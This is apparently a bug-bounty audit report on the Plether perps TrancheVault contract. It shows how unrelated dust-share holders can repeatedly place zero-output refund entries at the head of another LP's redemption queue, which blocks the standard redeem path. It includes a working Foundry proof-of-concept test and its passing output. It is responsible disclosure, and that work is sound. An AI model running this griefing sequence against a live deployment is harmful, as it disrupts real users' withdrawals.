# \#99621 [SC-Low] Zero-output redemptions can repeatedly occupy another LP's FIFO claim head

**Submitted on Nov 14th 2026 at 14:30:55 UTC by @Nescient for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99621
- **Report Type:** Smart Contract
- **Report severity:** Low
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol
- **Impacts:**
  - Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

# Description

## Finding

`requestRedeem` authorizes the share owner (or an owner-approved spender) and accepts an independently supplied controller address. It does not ask that controller to opt in. This lets an unrelated share holder create queue state for an LP who neither initiated nor approved the request.

The minimum-withdrawal rule has a full-balance exception. A holder whose complete balance is one share atom may redeem it even when the asset estimate rounds down to zero. When that is the only redemption in the epoch, permissionless HousePool settlement rejects the output and enables a share refund.

Two queues then diverge: settlement has finished with the epoch, while the victim's controller queue still contains the refund position. Standard redemption methods and their maximum views consult the oldest controller position. They do not advance past a refundable entry, so later funded requests are unavailable through that interface.

The request owner cannot acknowledge the refund: `claimRedeemRefund` checks the controller or its approved operator. The victim can clear it, but a nonzero share return stamps the receiver's cooldown. Once that hour has passed, another dust owner can install a fresh refund position at the same controller. The accompanying test exercises this sequence with two distinct owners, then claims the victim's funded USDG by request ID to show the bounded impact.

## Demonstrated effect

The attack repeatedly interrupts the victim's standard FIFO redemption workflow and requires victim-side cleanup. It costs the attacker a dust share atom and transaction fees, with no payout. Funded USDG remains claimable through the explicit-ID method, so the demonstrated severity is griefing rather than permanent asset loss.

The epoch must contain only zero-output dust for settlement to create this refund state. If enough other shares join that epoch to produce a positive quote, the refund-only head does not form.

# Recommendation

Bind the request controller to an authorization decision. When owner and controller differ, require the controller's explicit opt-in or an approval that covers this request type, in addition to the existing authorization to move the owner's shares. A second safeguard is to let standard claims retire a terminal refund entry before evaluating the next funded entry, while keeping returned shares payable only to the controller.

# References

- [Owner authorization, dust admission, and queue insertion in `TrancheVault`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L606-L708)
- [Zero-output epoch handling in `HousePool`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L957-L972)
- [Controller-head claims, explicit-ID claims, and refund acknowledgement in `TrancheVault`](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/TrancheVault.sol#L916-L1020)


## Proof of Concept

# Proof of Concept

Save as `packages/perps/test/perps/regression/RepeatableControllerHeadPoison.t.sol`:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {BasePerpTest} from "../BasePerpTest.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";

/// @notice Two unrelated dust owners can install successive refund-only epochs at one
///         controller, hiding a later funded redemption from the standard claim surface.
contract RepeatableControllerHeadPoisonTest is BasePerpTest {

    address internal constant LP = address(0xA11CE);
    address internal constant DUST_OWNER_ONE = address(0xD001);
    address internal constant DUST_OWNER_TWO = address(0xD002);
    address internal constant PAYOUT = address(0xBEEF);

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function _settleMaturedEpoch(
        uint256 epochId
    ) internal {
        uint256 readyAt = pool.lpEpochStart(epochId);
        if (block.timestamp < readyAt) {
            vm.warp(readyAt);
        }
        router.settleLpEpoch(_mockPythUpdateData(1e8));
    }

    function test_RepeatedRefundEpochsKeepStandardRedemptionBlocked() public {
        uint256 depositAssets = 100_000e6;
        settlementToken.mint(address(this), depositAssets);
        settlementToken.approve(address(juniorVault), depositAssets);
        uint256 depositId = juniorVault.requestDeposit(depositAssets, address(this), address(this));
        _settleMaturedEpoch(depositId);
        uint256 depositClaim = juniorVault.claimableDepositRequest(depositId, address(this));
        assertEq(depositClaim, depositAssets);
        uint256 issuedShares = juniorVault.claimDeposit(depositId, depositClaim, address(this), address(this));
        assertGt(issuedShares, 2);

        vm.warp(juniorVault.lastDepositTime(address(this)) + juniorVault.DEPOSIT_COOLDOWN());
        uint256 lpShares = issuedShares / 2;
        juniorVault.transfer(LP, lpShares);
        juniorVault.transfer(DUST_OWNER_ONE, 1);
        juniorVault.transfer(DUST_OWNER_TWO, 1);
        vm.warp(block.timestamp + juniorVault.DEPOSIT_COOLDOWN());

        assertEq(juniorVault.estimateRedeemAssets(1), 0, "single atom rounds to zero assets");
        assertFalse(juniorVault.isOperator(LP, DUST_OWNER_ONE), "LP gave no operator approval");

        vm.prank(DUST_OWNER_ONE);
        uint256 firstEpoch = juniorVault.requestRedeem(1, LP, DUST_OWNER_ONE);
        _settleMaturedEpoch(firstEpoch);
        assertTrue(juniorVault.redeemRefundPending(firstEpoch, LP));
        assertEq(juniorVault.controllerRedeemHead(LP), firstEpoch);

        vm.prank(LP);
        juniorVault.claimRedeemRefund(firstEpoch, LP, LP);
        assertEq(juniorVault.controllerRedeemHead(LP), 0);
        uint256 acknowledgedAt = juniorVault.lastDepositTime(LP);
        vm.warp(acknowledgedAt + juniorVault.DEPOSIT_COOLDOWN());

        vm.prank(DUST_OWNER_TWO);
        uint256 secondEpoch = juniorVault.requestRedeem(1, LP, DUST_OWNER_TWO);
        assertGt(secondEpoch, firstEpoch);
        _settleMaturedEpoch(secondEpoch);
        assertTrue(juniorVault.redeemRefundPending(secondEpoch, LP));
        assertEq(juniorVault.controllerRedeemHead(LP), secondEpoch);

        vm.prank(LP);
        uint256 lpRedeemId = juniorVault.requestRedeem(lpShares / 2, LP, LP);
        _settleMaturedEpoch(lpRedeemId);
        uint256 availableShares = juniorVault.claimableRedeemRequest(lpRedeemId, LP);
        uint256 availableAssets = juniorVault.claimableRedeemAssets(lpRedeemId, LP);
        assertGt(availableShares, 0);
        assertGt(availableAssets, 0);
        assertEq(juniorVault.maxRedeem(LP), 0);
        assertEq(juniorVault.maxWithdraw(LP), 0);

        vm.prank(LP);
        vm.expectRevert();
        juniorVault.redeem(availableShares, LP, LP);

        uint256 payoutBefore = settlementToken.balanceOf(PAYOUT);
        vm.prank(LP);
        uint256 received = juniorVault.claimRedeem(lpRedeemId, availableShares, PAYOUT, LP);
        assertEq(received, availableAssets);
        assertEq(settlementToken.balanceOf(PAYOUT), payoutBefore + availableAssets);
        assertEq(juniorVault.controllerRedeemHead(LP), secondEpoch);
    }

}
```

Run from the repository root:

```sh
forge test --root packages/perps \
  --match-path test/perps/regression/RepeatableControllerHeadPoison.t.sol -vv
```

Observed result on frozen commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`:

```text
Ran 1 test for test/perps/regression/RepeatableControllerHeadPoison.t.sol:RepeatableControllerHeadPoisonTest
[PASS] test_RepeatedRefundEpochsKeepStandardRedemptionBlocked()
Suite result: ok. 1 passed; 0 failed; 0 skipped
```

The test funds one LP through the asynchronous deposit API and makes every epoch transition through permissionless `OrderRouter.settleLpEpoch` with mock Pyth data. The normal router call updates the mark and enters HousePool settlement. Test pranks are limited to the named user accounts; the PoC does not impersonate a protocol contract or modify protocol storage.
